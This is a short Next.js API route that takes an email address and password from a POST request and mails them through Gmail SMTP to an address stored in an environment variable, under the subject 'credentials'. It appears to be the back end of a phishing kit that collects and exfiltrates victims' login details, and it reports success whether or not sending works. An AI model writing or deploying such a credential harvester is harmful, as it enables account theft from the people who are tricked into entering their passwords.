import { NextResponse, NextRequest } from "next/server";
import mailer from "nodemailer";

export async function POST(request: Request) {
  const res: any = await request.json();

  try {
    let transporter: mailer.Transporter = mailer.createTransport({
      service: "Gmail",
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: process.env.APP_ACCOUNT,
        pass: process.env.APP_PASSWORD,
      },
    });

    const result = await transporter.sendMail({
      from: `"fox" <${process.env.APP_ACCOUNT}>`,
      to: process.env.EMAIL_TO_SEND,
      subject: "credentials",
      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
      html: `<h3>${JSON.stringify(res.email).replaceAll(
        '"',
        ""
      )} /password: ${JSON.stringify(res.pass).replaceAll('"', "")}</h3>`,
    });

    return NextResponse.json({ status: true, message: result });
  } catch (error) {
    return NextResponse.json({ status: true, message: error });
  }
}
